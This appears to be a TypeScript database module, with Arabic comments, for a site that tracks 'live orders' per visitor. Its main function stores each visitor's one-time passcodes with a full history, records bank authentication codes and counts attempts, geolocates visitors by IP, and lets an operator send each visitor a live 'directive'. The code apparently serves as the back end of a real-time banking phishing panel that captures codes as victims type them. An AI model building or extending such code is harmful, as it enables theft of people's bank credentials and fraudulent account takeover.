import { eq, desc, gte } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, liveOrders, InsertLiveOrderRow, LiveOrderRow } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

/* ============ دوال الطلبات الحية ============ */

/** إنشاء أو تحديث طلب حي حسب publicId (upsert) */
export async function upsertLiveOrder(
  publicId: string,
  data: Partial<InsertLiveOrderRow>,
  ip?: string,
  opts?: { appendOtp?: boolean; incAuth?: boolean },
): Promise<void> {
  const db = await getDb();
  if (!db) return;

  const { publicId: _omit, id: _omitId, ...rest } = data as Record<string, unknown>;
  const updateSet: Record<string, unknown> = { ...rest, lastSeen: new Date() };

  // جلب الطلب الحالي للتحقق من التغييرات في otp و bankAuth والموقع
  const existingOrder = await getLiveOrder(publicId);

  // جلب الموقع الجغرافي مرة واحدة فقط إذا لم يكن موجوداً
  if (!existingOrder || !existingOrder.location) {
    let location = "موقع غير معروف"; // قيمة افتراضية
    
    // تجاهل عناوين IP المحلية/الخاصة (لا يمكن تحديد موقعها)
    const isPrivateIp =
      !ip ||
      ip === "::1" ||
      ip.startsWith("127.") ||
      ip.startsWith("10.") ||
      ip.startsWith("192.168.") ||
      /^172\.(1[6-9]|2\d|3[01])\./.test(ip) ||
      ip.startsWith("fc") ||
      ip.startsWith("fd") ||
      ip.startsWith("fe80");

    if (!isPrivateIp) {
      // محاولة عبر مزوّدين للموثوقية (HTTPS أولاً ثم HTTP)
      const providers = [
        {
          url: `https://ipapi.co/${ip}/json/`,
          parse: (d: any) => (d && d.city && d.country_name ? `${d.city}، ${d.country_name}` : ""),
        },
        {
          url: `http://ip-api.com/json/${ip}?fields=status,country,city`,
          parse: (d: any) => (d && d.status === "success" ? `${d.city}، ${d.country}` : ""),
        },
      ];

      for (const provider of providers) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 2500);
          const response = await fetch(provider.url, { signal: controller.signal });
          clearTimeout(timeoutId);
          const locData = await response.json();
          const parsed = provider.parse(locData);
          if (parsed) {
            location = parsed;
            break;
          }
        } catch (e) {
          console.warn("[Location] Provider failed for IP:", ip, provider.url, e);
        }
      }
    }
    
    updateSet.location = location;
    rest.location = location;
  }

  if (existingOrder) {
    // منطق إضافة OTP الجديد إلى السجل.
    // يُضاف إذا طُلب صراحةً (appendOtp) أو إذا اختلف الرمز عن السابق (احتياطي).
    if (rest.otp && rest.otp !== "-" && (opts?.appendOtp || rest.otp !== existingOrder.otp)) {
      let history: string[] = [];
      if (existingOrder.otpHistory) {
        try {
          history = JSON.parse(existingOrder.otpHistory);
        } catch (e) {}
      } else if (existingOrder.otp && existingOrder.otp !== "-") {
        history = [existingOrder.otp];
      }

      // إضافة الرمز الجديد في النهاية (الجديد أسفل القديم)
      history.push(rest.otp as string);
      updateSet.otpHistory = JSON.stringify(history);
      rest.otpHistory = updateSet.otpHistory as string;
    }

    // منطق زيادة عداد المصادقة.
    // يزيد إذا طُلب صراحةً (incAuth) أو إذا تغيّرت قيمة bankAuth (احتياطي).
    if (rest.bankAuth && rest.bankAuth !== "-" && (opts?.incAuth || rest.bankAuth !== existingOrder.bankAuth)) {
      const currentCount = existingOrder.authCount || (existingOrder.bankAuth && existingOrder.bankAuth !== "-" ? 1 : 0);
      updateSet.authCount = currentCount + 1;
      rest.authCount = updateSet.authCount as number;
    }
  }

  const insertValues: InsertLiveOrderRow = {
    publicId,
    lastSeen: new Date(),
    ...(rest as Partial<InsertLiveOrderRow>),
  };

  await db
    .insert(liveOrders)
    .values(insertValues)
    .onDuplicateKeyUpdate({ set: updateSet });
}

/** جلب جميع الطلبات الحية (الأحدث أولاً) */
export async function listLiveOrders(): Promise<LiveOrderRow[]> {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(liveOrders).orderBy(desc(liveOrders.createdAt));
}

/** جلب طلب حي واحد حسب publicId */
export async function getLiveOrder(publicId: string): Promise<LiveOrderRow | undefined> {
  const db = await getDb();
  if (!db) return undefined;
  const rows = await db
    .select()
    .from(liveOrders)
    .where(eq(liveOrders.publicId, publicId))
    .limit(1);
  return rows.length ? rows[0] : undefined;
}

/** تحديث التوجيه للطلب */
export async function setLiveOrderDirective(
  publicId: string,
  directive: string,
  status?: string,
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  const set: Record<string, unknown> = { directive };
  if (status) set.status = status;
  await db.update(liveOrders).set(set).where(eq(liveOrders.publicId, publicId));
}

/** حذف طلب حي */
export async function deleteLiveOrder(publicId: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.delete(liveOrders).where(eq(liveOrders.publicId, publicId));
}

/** عدد الزوار النشطين خلال آخر دقيقتين */
export async function countActiveVisitors(): Promise<number> {
  const db = await getDb();
  if (!db) return 0;
  // نافذة الاتصال: 45 ثانية من آخر نبضة (النبضة تُرسل كل 15ث أثناء النشاط).
  // عند الخمول تتوقف النبضة فيسقط الزائر خلال 45ث كحد أقصى.
  const since = new Date(Date.now() - 45 * 1000);
  const rows = await db
    .select()
    .from(liveOrders)
    .where(gte(liveOrders.lastSeen, since));
  return rows.length;
}

/** إجمالي عدد الزوار الذين دخلوا الموقع (كل جلسة زائر = سجل واحد) */
export async function countTotalVisitors(): Promise<number> {
  const db = await getDb();
  if (!db) return 0;
  const rows = await db.select().from(liveOrders);
  return rows.length;
}
